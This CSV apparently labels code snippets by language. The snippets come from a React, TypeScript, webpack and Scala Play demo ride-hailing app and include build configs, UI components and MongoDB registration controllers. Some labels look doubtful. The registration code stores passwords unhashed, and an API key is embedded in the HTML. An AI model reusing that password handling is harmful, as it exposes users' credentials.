correct,guess,snippet
JavaScript,javascript,"{  name: task1webpackconfig  version: 1.0.0  description: webpack 2 + TypeScript 2 + Babel example  repository: {    type: git    url: git+https://github.com/sachabarber/MadCapIdea.git  }  keywords: [    babel    typescript    webpack    bundling    javascript    npm  ]  author: sacha barber  homepage: https://github.com/sachabarber/MadCapIdea#readme  dependencies: {    bootstrap: ^3.3.7    inversify: ^4.1.0    jquery: ^3.2.1    lodash: ^4.17.4    react: ^15.5.4    react-bootstrap: ^0.28.1    react-bootstrap-validation: ^0.1.11    react-dom: ^15.5.4    react-google-maps: ^7.0.0    react-measure: ^2.0.2    react-router: ^3.0.5    react-stars: ^2.1.0    reflect-metadata: ^0.1.10    revalidator: ^0.3.1    rx: ^4.1.0    webpack: ^2.5.1    webpack-merge: ^4.1.0  }  devDependencies: {    @types/jquery: ^2.0.43    @types/lodash: ^4.14.63    @types/react: ^15.0.24    @types/react-dom: ^15.5.0    @types/rx: ^4.1.1    awesome-typescript-loader: ^3.1.3    babel-core: ^6.24.1    babel-loader: ^7.0.0    babel-preset-es2015: ^6.24.1    babel-preset-es2015-native-modules: ^6.9.4    babel-preset-react: ^6.24.1    css-loader: ^0.28.1    extract-text-webpack-plugin: ^2.1.0    file-loader: ^0.11.1    html-webpack-plugin: ^2.28.0    node-sass: ^4.5.2    on-build-webpack: ^0.1.0    sass-loader: ^6.0.3    source-map-loader: ^0.2.1    typescript: ^2.3.2    url-loader: ^0.5.8    webpack: ^2.4.1  }  scripts: {    build-dev: webpack -d --config webpack.develop.js    build-prod: webpack --config webpack.production.js  }}"
JavaScript,javascript,"{  compilerOptions: {    allowSyntheticDefaultImports: true    moduleResolution: node    outDir: ./dist/    sourceMap: true    noImplicitAny: false    module: es2015    target: es5    lib: [es6 dom]    jsx: react    experimentalDecorators: true    emitDecoratorMetadata: true    types : [jquery lodash react react-dom reflect-metadata]  }    include: [        ./src/**/*    ]}"
JavaScript,javascript,"let _ = require('lodash');let webpack = require('webpack');let path = require('path');let fs = require(fs);let WebpackOnBuildPlugin = require('on-build-webpack');let ExtractTextPlugin = require('extract-text-webpack-plugin');let HtmlWebpackPlugin = require('html-webpack-plugin');let babelOptions = {    presets: [es2015 react]};function isVendor(module) {    return module.context && module.context.indexOf('node_modules') !== -1;}let entries = {    index: './src/index.tsx'    indexCss: './scss/index.scss'};//build it to the Play Framework public folder which is services by the assets controllerlet buildDir = path.resolve(__dirname '../public/dist');module.exports = {    context: __dirname    entry: entries    output: {        filename: '[name].bundle.[hash].js'        path: buildDir		//this is to make it play nice with the Play Framework Assets controllers		//that deals with static data		publicPath: '/assets/dist'    }    // these break for node 5.3+ when building WS stuff    node: {        fs: 'empty'    }    watch: true    devServer: {        open: true // to open the local server in browser        contentBase: __dirname    }    // Enable sourcemaps for debugging webpack's output.    devtool: source-map    resolve: {        extensions: [.tsx .ts .js .jsx]        modules: [path.resolve(__dirname src) node_modules]    }    plugins: [        //The ProvidePlugin makes a module available as a variable in every other        //module required by webpack        new webpack.ProvidePlugin({            $: jquery            jQuery: jquery            window.jQuery: jquery        })        // creates a common vendor js file for libraries in node_modules        new webpack.optimize.CommonsChunkPlugin({            names: ['vendor']            minChunks: function (module count) {                return isVendor(module);            }        })        // creates a common vendor js file for libraries in node_modules        new webpack.optimize.CommonsChunkPlugin({            name: commons            chunks: _.keys(entries)            minChunks: function (module count) {                return !isVendor(module) && count > 1;            }        })        //will unlink unused files on a build        //http://stackoverflow.com/questions/40370749/how-to-remove-old-files-from-the-build-dir-when-webpack-watch        new WebpackOnBuildPlugin(function (stats) {            const newlyCreatedAssets = stats.compilation.assets;            const unlinked = [];            fs.readdir(path.resolve(buildDir) (err files) => {                files.forEach(file => {                    if (file != fonts) {                        if (!newlyCreatedAssets[file]) {                            fs.unlink(path.resolve(buildDir + '\\' + file));                            unlinked.push(file);                        }                    }                });                if (unlinked.length > 0) {                    console.log('Removed old assets: ' unlinked);                }            })        })        //scss/sass files extracted to common css bundle        new ExtractTextPlugin({            filename: '[name].bundle.[hash].css'            allChunks: true        })        new HtmlWebpackPlugin({            filename: 'index.html'            template: 'template.html'        })    ]    module: {        rules: [            // All files with a '.ts' or '.tsx' extension will be handled by 'awesome-typescript-loader' 1st             // then 'babel-loader'            // NOTE : loaders run right to left (think of them as a cmd line pipe)            {                test: /\.ts(x?)$/                exclude: /node_modules/                use: [                  {                      loader: 'babel-loader'                      options: babelOptions                  }                  {                      loader: 'awesome-typescript-loader'                  }                ]            }            // All files with a .css extenson will be handled by 'css-loader'            {                test: /\.css$/                loader: ExtractTextPlugin.extract(['css-loader?importLoaders=1'])            }            // All files with a .scss|.sass extenson will be handled by 'sass-loader'            {                test: /\.(sass|scss)$/                loader: ExtractTextPlugin.extract(['css-loader' 'sass-loader'])            }            // All files with a '.js' extension will be handled by 'babel-loader'.            {                test: /\.js$/                exclude: /node_modules/                use: [                  {                      loader: 'babel-loader'                      options: babelOptions                  }                ]            }            {                 test: /\.png$/                 loader: url-loader?limit=100000             }                  {                 test: /\.jpg$/                 loader: file-loader             }            {                test: /\.woff(\?.*)?$/                loader: 'url-loader?prefix=fonts/&name=fonts/[name].[ext]&limit=10000&mimetype=application/font-woff'            }            {                test: /\.woff2(\?.*)?$/                loader: 'url-loader?prefix=fonts/&name=fonts/[name].[ext]&limit=10000&mimetype=application/font-woff2'            }            {                test: /\.ttf(\?.*)?$/                loader: 'url-loader?prefix=fonts/&name=fonts/[name].[ext]&limit=10000&mimetype=application/octet-stream'            }            {                test: /\.eot(\?.*)?$/ loader: 'file-loader?prefix=fonts/&name=fonts/[name].[ext]'            }            {                test: /\.svg(\?.*)?$/                loader: 'url-loader?prefix=fonts/&name=fonts/[name].[ext]&limit=10000&mimetype=image/svg+xml'            }            // All output '.js' files will have any sourcemaps re-processed by 'source-map-loader'.            {                enforce: pre                test: /\.js$/                loader: source-map-loader            }        ]    }};"
JavaScript,javascript,"let commonConfig = require('./webpack.config.js');let webpack = require('webpack');let Merge = require('webpack-merge');module.exports = function (env) {    return Merge(commonConfig {        plugins: [          new webpack.LoaderOptionsPlugin({              minimize: true              debug: false          })          new webpack.optimize.UglifyJsPlugin({              // Eliminate comments              comments: false              beautify: false              mangle: {                  screw_ie8: true                  keep_fnames: true              }              compress: {                  screw_ie8: true                  // remove warnings                  warnings: false                  // Drop console statements                  drop_console: true              }              comments: false              sourceMap: false          })        ]    })}"
JavaScript,javascript,"//build it to the Play Framework public folder which is services by the assets controllerlet buildDir = path.resolve(__dirname '../public/dist');output: {        filename: '[name].bundle.[hash].js'        path: buildDir		//this is to make it play nice with the Play Framework Assets controllers		//that deals with static data		publicPath: '/assets/dist'    }....    ....    ....    ....    new HtmlWebpackPlugin({            filename: 'index.html'            template: 'template.html'        })        "
HTML,html,"<!DOCTYPE html><html><head>    <meta charset=UTF-8 />    <title>Hello React!</title>    <script src=https://maps.googleapis.com/maps/api/js?key=AIzaSyBVtreRNA537_WsNSn2_kOiz3Xhm8w6pEo            type=text/javascript></script></head><body>    <div>        <iframe id=comet src=/job/streamedJob></iframe>    </div>    <div id=root></div>    <!-- Main --></body></html>	"
HTML,html,"<!DOCTYPE html><html><head>    <meta charset=UTF-8 />    <title>Hello React!</title>    <script src=https://maps.googleapis.com/maps/api/js?key=AIzaSyBVtreRNA537_WsNSn2_kOiz3Xhm8w6pEo            type=text/javascript></script><link href=/assets/dist/vendor.bundle.5c5feaa8663412cf31c5.css rel=stylesheet><link href=/assets/dist/indexCss.bundle.5c5feaa8663412cf31c5.css rel=stylesheet></head><body>    <div>        <iframe id=comet src=/job/streamedJob></iframe>    </div>    <div id=root></div>    <!-- Main --><script type=text/javascript src=/assets/dist/vendor.bundle.5c5feaa8663412cf31c5.js></script><script type=text/javascript src=/assets/dist/index.bundle.5c5feaa8663412cf31c5.js></script></body></html>		"
Scala,scala,"package controllersimport javax.inject.Injectimport play.api.mvc.{Action Controller}class HomeController @Inject() (environment: play.api.Environment)  extends Controller {  def index() = Action {    val fullpath = s${environment.rootPath}\\public\\dist\\index.html    val htmlContents = scala.io.Source.fromFile(fullpath).mkString    Ok(htmlContents).as(text/html)  }}"
JavaScript,javascript,"let entries = {    index: './src/index.tsx'    .....    .....    .....    .....};//build it to the Play Framework public folder which is services by the assets controllerlet buildDir = path.resolve(__dirname '../public/dist');module.exports = {    context: __dirname    entry: entries			.....	.....	.....	.....	.....}"
React,react,"import * as React from react;import * as ReactDOM from react-dom;import 'bootstrap/dist/css/bootstrap.css';import {    Nav    Navbar    NavItem    NavDropdown    MenuItem    Button} from react-bootstrap;import { Router Route hashHistory } from 'react-router'import { Login } from ./Login;import { Logout } from ./Logout;import { Register } from ./Register;import { CreateJob } from ./CreateJob;import { ViewJob } from ./ViewJob;import { ViewRating } from ./ViewRating;import { ContainerOperations } from ./ioc/ContainerOperations;import { AuthService } from ./services/AuthService;import { JobService } from ./services/JobService;import { JobStreamService } from ./services/JobStreamService;import { PositionService } from ./services/PositionService;import { TYPES } from ./types;import Rx from 'rx';let authService = ContainerOperations.getInstance().container.get<AuthService>(TYPES.AuthService);let jobService = ContainerOperations.getInstance().container.get<JobService>(TYPES.JobService);let jobStreamService = ContainerOperations.getInstance().container.get<JobStreamService>(TYPES.JobStreamService);let positionService = ContainerOperations.getInstance().container.get<PositionService>(TYPES.PositionService);jobStreamService.init();export interface MainNavProps {    authService: AuthService;    jobService: JobService;    jobStreamService: JobStreamService;    positionService: PositionService;}export interface MainNavState {    isLoggedIn: boolean;}class MainNav extends React.Component<MainNavProps MainNavState> {    private _subscription: any;    constructor(props: any) {        super(props);        console.log(props);        this.state = {            isLoggedIn: false        };    }    componentWillMount() {        this._subscription = this.props.authService.getAuthenticationStream()            .subscribe(isAuthenticated => {                this.state = {                    isLoggedIn: isAuthenticated                };                if (this.state.isLoggedIn) {                    hashHistory.push('/createjob');                }                else {                    hashHistory.push('/');                }            });    }    componentWillUnmount() {        this._subscription.dispose();    }    render() {        return (            this.state.isLoggedIn ?                <Navbar collapseOnSelect>                    <Navbar.Header>                        <Navbar.Brand>                            <span>Simple Kafka-Uber</span>                        </Navbar.Brand>                        <Navbar.Toggle />                    </Navbar.Header>                    <Navbar.Collapse>                        <Nav pullRight>                            <NavItem eventKey={2} href='#/logout'>Logout</NavItem>                            <NavItem eventKey={2} href='#/createjob'>Create Job</NavItem>                            <NavItem eventKey={2} href='#/viewjob'>View Job</NavItem>                            <NavItem eventKey={2} href='#/viewrating'>View Rating</NavItem>                        </Nav>                    </Navbar.Collapse>                </Navbar> :                <Navbar pullRight collapseOnSelect>                    <Navbar.Header>                        <Navbar.Brand>                            <span>Simple Kafka-Uber</span>                        </Navbar.Brand>                        <Navbar.Toggle />                    </Navbar.Header>                    <Navbar.Collapse>                    </Navbar.Collapse>                </Navbar>        )    }}class App extends React.Component<undefined undefined> {    render() {        return (            <div>                <div>                    <MainNav                        authService={authService}                        jobService={jobService}                        jobStreamService={jobStreamService}                        positionService={positionService}                    />                    {this.props.children}                </div>            </div>        )    }}ReactDOM.render((    <Router history={hashHistory}>        <Route component={App}>            <Route                path=/                component={Login}                authService={authService} />            <Route                path=/register                component={Register}                authService={authService} />            <Route                path=/logout                component={Logout}                authService={authService}                jobService={jobService}                positionService={positionService} />            <Route                path=/createjob                component={CreateJob}                authService={authService}                jobService={jobService}                positionService={positionService} />            <Route                path=/viewjob                component={ViewJob}                authService={authService}                jobService={jobService}                jobStreamService={jobStreamService}                positionService={positionService} />            <Route                path=/viewrating                component={ViewRating}                authService={authService} />        </Route>    </Router>) document.getElementById('root'));"
Angular,angular,"import { injectable inject } from inversify;import { TYPES } from ../types;import Rx from 'rx';@injectable()export class AuthService {    private _isAuthenticated: boolean;    private _authenticatedSubject = new Rx.Subject<boolean>();    constructor() {    }    clearUser = (): void => {        this._isAuthenticated = false;        sessionStorage.removeItem('currentUserProfile');        this._authenticatedSubject.onNext(false);    }    storeUser = (currentProfile: any): void => {        if (currentProfile == null || currentProfile == undefined)            return;        this._isAuthenticated = true;        sessionStorage.setItem('currentUserProfile' JSON.stringify(currentProfile));        this._authenticatedSubject.onNext(true);    }    userName = (): string => {        var userProfile = JSON.parse(sessionStorage.getItem('currentUserProfile'));        return userProfile.user.fullName;    }    user = (): any => {        var userProfile = JSON.parse(sessionStorage.getItem('currentUserProfile'));        return userProfile.user;    }    userEmail = (): string => {        var userProfile = JSON.parse(sessionStorage.getItem('currentUserProfile'));        return userProfile.user.email;    }    isDriver = (): boolean => {        var userProfile = JSON.parse(sessionStorage.getItem('currentUserProfile'));        return userProfile.isDriver;    }    isAuthenticated = (): boolean => {        return this._isAuthenticated;    }    getAuthenticationStream = (): Rx.Observable<boolean> => {        return this._authenticatedSubject.asObservable();    }}"
React,react,"import * as React from react;import * as ReactDOM from react-dom;import * as _ from lodash; import 'bootstrap/dist/css/bootstrap.css';import{    Button     Modal} from react-bootstrap;  //TODO : Fix thisexport interface YesNoDialogProps {    headerText: string;    theId: string;    launchButtonText: string;    yesCallBack: any;    noCallBack: any;} export interface YesNoDialogState {    showModal: boolean;}  export class YesNoDialog extends React.Component<YesNoDialogProps YesNoDialogState> {     constructor(props) {        super(props);        console.log(this.props);        //set initial state        this.state = {            showModal: false        };    }     _yesClicked = () => {        this.setState({ showModal: false });        this.props.yesCallBack();    }     _noClicked = () => {        this.setState({ showModal: false });        this.props.noCallBack();    }     _close = () => {        this.setState({ showModal: false });    }     _open = () => {        this.setState({ showModal: true });    }     render() {        return (            <div className=leftFloat>                 <Button                    id={this.props.theId}                    type='button'                    bsSize='small'                    bsStyle='primary'                    onClick={this._open}>{this.props.launchButtonText}</Button>                 <Modal show={this.state.showModal} onHide={this._close}>                    <Modal.Header closeButton>                        <Modal.Title>{ this.props.headerText }</Modal.Title>                    </Modal.Header>                    <Modal.Body>                        <h4>Are you sure?</h4>                    </Modal.Body>                    <Modal.Footer>                        <Button                            type='button'                            bsSize='small'                            bsStyle='primary'                            onClick={this._yesClicked}>Yes</Button>                        <Button                            type='button'                            bsSize='small'                            bsStyle='danger'                            onClick={this._noClicked}>Cancel</Button>                    </Modal.Footer>                </Modal>            </div>        );    }}"
React,react,"import * as React from react;import * as ReactDOM from react-dom;import * as _ from lodash; import 'bootstrap/dist/css/bootstrap.css';import{    Button     Modal} from react-bootstrap;  //TODO : Fix thisexport interface OkDialogProps {    headerText: string;    bodyText: string;    open: boolean;    okCallBack: any;} export interface OkDialogState {    showModal: boolean;}  export class OkDialog extends React.Component<OkDialogProps OkDialogState> {     constructor(props) {        super(props);        console.log(this.props);        //set initial state        this.state = {            showModal: false        };    }     componentDidMount() {        if (this.props.open === true) {            this.setState({ showModal: true });        }    }     _okClicked = () => {        this.setState({ showModal: false });        this.props.okCallBack();    }     _close = () => {        this.setState({ showModal: false });        this.props.okCallBack();    }     _open = () => {        this.setState({ showModal: true });    }     render() {        return (            <div className=leftFloat>                 <Modal show={this.state.showModal} onHide={this._close}>                    <Modal.Header closeButton>                        <Modal.Title>{ this.props.headerText }</Modal.Title>                    </Modal.Header>                    <Modal.Body>                        <h4>{this.props.bodyText}</h4>                    </Modal.Body>                    <Modal.Footer>                        <Button                            type='button'                            bsSize='small'                            bsStyle='primary'                            onClick={this._okClicked}>Ok</Button>                    </Modal.Footer>                </Modal>            </div>        );    }}"
React,react,"import * as React from react;import * as ReactDOM from react-dom;import * as _ from lodash; import 'bootstrap/dist/css/bootstrap.css';import{    Button     Modal} from react-bootstrap;  import ReactStars from 'react-stars';  export interface RatingDialogProps {    headerText: string;    theId: string;    okCallBack: any;} export interface RatingDialogState {    showModal: boolean;    rating: number;}  export class RatingDialog extends React.Component<RatingDialogProps RatingDialogState> {     constructor(props) {        super(props);        console.log(this.props);         //set initial state        this.state = {            showModal: false            rating:0        };    }     _close = () => {        this.setState(            {                showModal: false                rating:0            }        );    }     _open = () => {        this.setState(            {                showModal: true                rating: 0            }        );    }     _ratingChanged = (newRating) => {        console.log(newRating)        this.setState(            {                rating: newRating            }        );    }     _okClicked = () => {        this._close();        this.props.okCallBack();    }     render() {        return (            <div className=leftFloat>                 <Button                    id={this.props.theId}                    type='button'                    bsSize='small'                    bsStyle='primary'                    onClick={this._open}>Complete</Button>                 <Modal show={this.state.showModal} onHide={this._close}>                    <Modal.Header closeButton>                        <Modal.Title>{ this.props.headerText }</Modal.Title>                    </Modal.Header>                    <Modal.Body>                        <h4>Give your rating between 1-5</h4>                        <ReactStars count={5}                                    onChange={this._ratingChanged}                                    size={24}                                    color2={'#ffd700'} />                    </Modal.Body>                    <Modal.Footer>                        <Button                            type='submit'                            bsSize='small'                            bsStyle='primary'                            onClick={this._okClicked}>Ok</Button>                    </Modal.Footer>                </Modal>            </div>        );"
React,react,"import * as React from react;import * as ReactDOM from react-dom;import { OkDialog } from ./components/OkDialog;import 'bootstrap/dist/css/bootstrap.css';import {    Well    Grid    Row    Col    ButtonInput} from react-bootstrap;import { AuthService } from ./services/AuthService;import { hashHistory } from 'react-router';import { Form ValidatedInput } from 'react-bootstrap-validation';import revalidator from 'revalidator';let schema = {    properties: {        fullName: {            type: 'string'            minLength: 8            maxLength: 60            required: true            allowEmpty: false        }        email: {            type: 'string'            maxLength: 255            format: 'email'            required: true            allowEmpty: false        }        password: {            type: 'string'            minLength: 8            maxLength: 60            required: true            allowEmpty: false        }    }};export interface PassengerRegistrationProps {    authService: AuthService;}export interface PassengerRegistrationState {    okDialogOpen: boolean;    okDialogKey: number;    okDialogHeaderText: string;    okDialogBodyText: string;    wasSuccessful: boolean;}export class PassengerRegistration extends React.Component<PassengerRegistrationProps PassengerRegistrationState> {    constructor(props: any) {        super(props);        this.state = {            okDialogHeaderText: ''            okDialogBodyText: ''            okDialogOpen: false            okDialogKey: 0            wasSuccessful: false        };    }    render() {        return (            <Form className=submittable-form-inner                // Supply callbacks to both valid and invalid                // submit attempts                validateAll={this.validateForm}                onInvalidSubmit={this.handleInvalidSubmit}                onValidSubmit={this.handleValidSubmit}>                <Grid>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <h4>Passenger details</h4>                        </Col>                    </Row>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <ValidatedInput type='text'                                label='FullName'                                name='fullName'                                errorHelp='FullName is invalid' />                        </Col>                    </Row>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <ValidatedInput type='text'                                label='Email'                                name='email'                                errorHelp='Email address is invalid' />                        </Col>                    </Row>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <ValidatedInput type='password'                                label='Password'                                name='password'                                errorHelp='Password is invalid' />                        </Col>                    </Row>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <ButtonInput                                id=registerBtn                                type='submit'                                bsSize='small'                                bsStyle='primary'                                value='Register'>Register</ButtonInput>                        </Col>                    </Row>                    <Row className=show-grid>                        <span>                            <OkDialog                                open={this.state.okDialogOpen}                                okCallBack={this.okDialogCallBack}                                headerText={this.state.okDialogHeaderText}                                bodyText={this.state.okDialogBodyText}                                key={this.state.okDialogKey} />                        </span>                    </Row>                </Grid>            </Form>        )    }    validateForm = (values) => {        let res = revalidator.validate(values schema);        // If the values passed validation we return true        if (res.valid) {            return true;        }        // Otherwise we should return an object containing errors        // e.g. { email: true password: true }        return res.errors.reduce((errors error) => {            // Set each property to either true or            // a string error description            errors[error.property] = true;            return errors;        } {});    }    handleInvalidSubmit = (errors values) => {        // Errors is an array containing input names        // that failed to validate        this.setState(            {                okDialogHeaderText: 'Validation Error'                okDialogBodyText: 'Form has errors and may not be submitted'                okDialogOpen: true                okDialogKey: Math.random()            });    }    handleValidSubmit = (values) => {        var passenger = values;        var self = this;        $.ajax({            type: 'POST'            url: 'registration/save/passenger'            data: JSON.stringify(passenger)            contentType: application/json; charset=utf-8            dataType: 'json'        })        .done(function (jdata textStatus jqXHR) {            var redactedPassenger = passenger;            redactedPassenger.password = ;            console.log(redacted ${redactedPassenger});            console.log(redactedPassenger);            console.log(Auth Service);            console.log(self.props.authService);            let userProfile = {                isDriver: false                user: redactedPassenger            };            self.setState(                {                    wasSuccessful: true                    okDialogHeaderText: 'Registration Successful'                    okDialogBodyText: 'You are now registered'                    okDialogOpen: true                    okDialogKey: Math.random()                });            self.props.authService.storeUser(userProfile);        })        .fail(function (jqXHR textStatus errorThrown) {            self.setState(                {                    okDialogHeaderText: 'Error'                    okDialogBodyText: jqXHR.responseText                    okDialogOpen: true                    okDialogKey: Math.random()                });        });    }    okDialogCallBack = () => {        this.setState(            {                okDialogOpen: false            });        if (this.state.wasSuccessful) {            hashHistory.push('/');        }    }}"
Scala,scala,"package entitiesimport play.api.libs.json._import play.api.libs.functional.syntax._case class PassengerRegistration(  fullName: String  email: String  password: String)object PassengerRegistration {  implicit val formatter = Json.format[PassengerRegistration]}object PassengerRegistrationJsonFormatters {  implicit val passengerRegistrationWrites = new Writes[PassengerRegistration] {    def writes(passengerRegistration: PassengerRegistration) = Json.obj(      fullName -> passengerRegistration.fullName      email -> passengerRegistration.email      password -> passengerRegistration.password    )  }  implicit val passengerRegistrationReads: Reads[PassengerRegistration] = (    (JsPath \ fullName).read[String] and      (JsPath \ email).read[String] and      (JsPath \ password).read[String]    )(PassengerRegistration.apply _)}"
Scala,scala,"package controllersimport javax.inject.Injectimport play.api.mvc.{Action Controller Result}import entities._import entities.DriverRegistrationJsonFormatters._import entities.PassengerRegistrationJsonFormatters._import scala.concurrent.{ExecutionContext Future}import play.modules.reactivemongo._import play.api.Loggerimport utils.Errorsimport play.api.libs.json._import reactivemongo.api.ReadPreferenceimport reactivemongo.play.json._import collection._class RegistrationController @Inject()  (val reactiveMongoApi: ReactiveMongoApi)  (implicit ec: ExecutionContext)  extends Controller with MongoController with ReactiveMongoComponents {  def passRegistrationFuture: Future[JSONCollection] = database.map(_.collection[JSONCollection](passenger-registrations))  def driverRegistrationFuture: Future[JSONCollection] = database.map(_.collection[JSONCollection](driver-registrations))  def savePassengerRegistration = Action.async(parse.json) { request =>    Json.fromJson[PassengerRegistration](request.body) match {      case JsSuccess(newPassRegistration _) =>        //https://github.com/ReactiveMongo/ReactiveMongo-Extensions/blob/0.10.x/guide/dsl.md        val query = Json.obj(email -> Json.obj($eq -> newPassRegistration.email))        dealWithRegistration[PassengerRegistration](          newPassRegistration          passRegistrationFuture          query          PassengerRegistration.formatter)      case JsError(errors) =>        Future.successful(BadRequest(Could not build a PassengerRegistration from the json provided.  +          Errors.show(errors)))    }  }  private def dealWithRegistration[T](          incomingRegistration: T          jsonCollectionFuture: Future[JSONCollection]          query: JsObject          formatter: OFormat[T])          (implicit ec: ExecutionContext): Future[Result] = {    def hasExistingRegistrationFuture = jsonCollectionFuture.flatMap {        //http://reactivemongo.org/releases/0.11/documentation/advanced-topics/collection-api.html        _.find(query)        .cursor[JsObject](ReadPreference.primary)        .collect[List]()      }.map(_.length match {          case 0 => false          case _ => true      }    )    hasExistingRegistrationFuture.flatMap {      case false => {        for {          registrations <- jsonCollectionFuture          writeResult <- registrations.insert(incomingRegistration)(formatterec)        } yield {          Logger.debug(sSuccessfully inserted with LastError: $writeResult)          Ok(Json.obj())        }      }      case true => Future(BadRequest(Registration already exists))    }  }}"
